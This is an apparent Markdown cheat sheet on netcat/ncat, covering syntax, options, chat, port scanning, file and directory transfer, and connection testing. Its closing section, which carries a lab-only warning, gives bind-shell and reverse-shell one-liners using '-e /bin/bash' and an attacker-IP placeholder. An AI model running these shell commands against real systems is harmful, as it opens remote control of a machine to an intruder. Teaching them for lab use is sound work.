- It can read/write data across network connections using TCP or UDP.
- The command differs depending on the system (netcat, nc, ncat, and others).
- On Ubuntu, the commands nc and netcat both work as symbolic links for the OpenBSD version of Netcat. On CentOS, Debian, and RHEL, the command is ncat.
- Common uses: port scanning, file transfer, banner grabbing, testing connections, debugging, and chat between systems.
- Netcat is a crucial tool to master for network and system administrators due to the rich connection troubleshooting features and scripting usability.
- Syntax:
  ```bash
  nc [options] [host] [port]
  ```
  - The <host> is either a numeric IP address or a symbolic hostname.
  - The <port> is either a numeric port or service name.
 
- Netcat has two working modes:
  - Connect mode. In connect mode, Netcat works as a client. The utility requires the <host> and <port> parameters.
  - Listen mode. In listen mode, Netcat works as a server. When <host> is omitted, Netcat listens on all available addresses for the specified port.

- Man
  ```bash
  man netcat
  ```

### Other Useful Options
| Option(s)                           | Description                                               | Notes / Example                                                          |
| ----------------------------------- | --------------------------------------------------------- | ------------------------------------------------------------------------ |
| `-4`                                | Force IPv4 only                                           | `nc -4 -v example.com 80`                                                |
| `-6`                                | Force IPv6 only                                           | `nc -6 -v example.com 80`                                                |
| `-U`, `--unixsock`                  | Use a Unix domain socket                                  | `nc -U /var/run/mysock` (implementation-dependent)                       |
| `-l`, `--listen`                    | Listen for incoming connections (server mode)             | `nc -l -p 1234`                                                          |
| `-p <port>`, `--source-port <port>` | Local/source port to bind to                              | `nc -l -p 5555` or `nc -p 4444 host 80`                                  |
| `-s <host>`, `--source <host>`      | Bind outgoing connection to a specific local IP/interface | `nc -s 192.168.1.10 host 80`                                             |
| `-u`                                | Use UDP instead of TCP                                    | `nc -u -l -p 53`                                                         |
| `-v`, `--verbose`                   | Verbose output                                            | `nc -v host 22`                                                          |
| `-vv`                               | Very verbose (extra detail)                               | `nc -vv host 22`                                                         |
| `-k`, `--keep-open`                 | Keep listening after handling a connection                | `nc -l -k -p 8080` (not in all builds)                                   |
| `-z`                                | Zero-I/O mode (scan only; do not send data)               | `nc -zv host 1-1024`                                                     |
| `-g <hop,hop,...>`                  | Set loose source routing hops (IPv4)                      | Rarely used; `-g 1.2.3.4,5.6.7.8` (implementation-specific)              |
| `-w <secs>`                         | Timeout for connects and final net reads                  | `nc -w 3 host 80`                                                        |
| `-n`                                | Do not resolve DNS (use numeric IPs)                      | `nc -n 8.8.8.8 53`                                                       |
| `-e <command>`                      | Execute command after connection (pipes stdin/stdout)     | `nc -l -p 4444 -e /bin/bash` — often disabled for security               |
| `-C`                                | Send CRLF as line-ending                                  | Useful for some text protocols (implementation-specific)                 |
| `-N`                                | Shutdown socket after EOF on stdin                        | Signals EOF to remote after sending input (some builds)                  |
| `-P <proxy>` / `-X <proxy-type>`    | Proxy support (ncat / enhanced builds)                    | `ncat --proxy 10.0.0.1:8080 --proxy-type http host 80`                   |
| `--send-only` / `--recv-only`       | Restrict direction of data flow (ncat/enhanced builds)    | `ncat --send-only host 80`                                               |
| `--version` / `--help`              | Show version or help text                                 | `nc --help` or `nc --version`                                            |
| (no flag)                           | Basic connect (client)                                    | `nc host 80` connects TCP by default                                     |
| (stdin redirection)                 | Send file / receive file                                  | Sender: `nc -l -p 5555 < file.txt` Receiver: `nc sender 5555 > file.txt` |

* Notes:
  - Multiple nc implementations exist (e.g., netcat-traditional, OpenBSD nc, ncat from Nmap). Flags and features differ between them — especially -e, -k, --unixsock, proxy flags, and -g.
  - Check your system: nc --help or man nc to confirm which options your binary supports.
  - -e (remote command execution) is dangerous and often removed from secure builds — use only in controlled lab environments.


### Commands

#### Client/Server Connection
- Simple Chat / Message Transfer --> both can type message and it will reflect on each other
* Listen on a specific port (server mode)
  ```bash
  ncat -l -v -p <port>
  ```
  - -l = listen
  - -v = verbos
  - -p = port
    
  ```bash
  ncat -l -v -p 1234
  ```
  - Listens on TCP port 1234 for incoming connections.

* Connect to a TCP port (client mode)
  ```bash
  ncat -v <target_IP> <port>
  ```
  ```bash
  ncat -v 192.168.1.10 80
  ```
  - Connects to port 80 (HTTP) on 192.168.1.10

* Specify protocol (TCP or UDP)
  ```bash
  ncat -l -u -p <port>     # UDP listener
  ncat -u <host> <port>    # UDP client
  ```
  ```bash
  ncat -u 192.168.1.10 53
  ```
* Send a message from either device, and the same message shows up on the other device. The client and server behave the same after the connection establishes.
  ```bash
  # Server
  [root@system5 ~]# ncat -lv 1234
  Ncat: Version 7.92 ( https://nmap.org/ncat )
  Ncat: Listening on :::1234
  Ncat: Listening on 0.0.0.0:1234
  Ncat: Connection from 192.168.29.80.
  Ncat: Connection from 192.168.29.80:33040.
  hello

  # Client
  [root@localhost ~]# ncat -v 192.168.29.73 1234
  Ncat: Version 7.92 ( https://nmap.org/ncat )
  Ncat: Connected to 192.168.29.73:1234.
  hello
  ```

  ```bash
  nc -lkv 1234
  ```
  - The -k option ensures the connection stays open after a disconnect.

#### Port Scanning(check port open or not)
* Scan a single port
  ```bash
  nc -zv <target> <port>
  nc -zv 192.168.1.1 22
  ```

* Scan multiple ports
  ```bash
  nc -zv <target> 20-80
  ```

* Scan multiple targets
  ```bash
  nc -zv 192.168.1.{1,2,3} 22-25
  ```

* Display only open ports
  ```bash
  nc -zvw 1 <target> 1-1024 2>&1 | grep succeeded
  ```

#### File Transfer
  ```bash
  touch file.txt
  ```
* Send file (sender side)
  ```bash
  nc -l -v -p 5555 < file.txt
  ```

* Receive file (receiver side)
  ```bash
  nc <sender_IP> 5555 > file.txt
  ```

* Transfer directories (with tar)
  ```bash
  # Sender:
  tar -czf - /path/to/dir | nc -l -p 5555
  
  # Receiver:
  nc <sender_IP> 5555 | tar -xzf -
  ```

  
#### Testing Connections and Debugging
* Check if a remote service is reachable
  ```bash
  nc -vz <host> <port>
  nc -zv google.com 443
  ```
  - The -z option ensures the connection does not persist.
  - If the ping succeeds, the output shows the successful connection message.
 
* Specify timeout
  ```bash
  nc -w <seconds> <host> <port>
  nc -w 3 8.8.8.8 53
  ```

* Send custom data
  ```bash
  echo "hello" | nc <host> <port>
  ```

#### Reverse & Bind Shells (for testing only)
* (⚠️ Legal note: Use these only in lab environments you own.)

* Bind Shell (server waits for connection)
  ```bash
  # On target machine
  nc -l -p 4444 -e /bin/bash
  # On attacker machine
  nc <target_IP> 4444

* Reverse Shell (target connects back)
  ```bash
  # On attacker machine
  nc -l -p 4444
  # On target machine
  nc <attacker_IP> 4444 -e /bin/bash
  ```
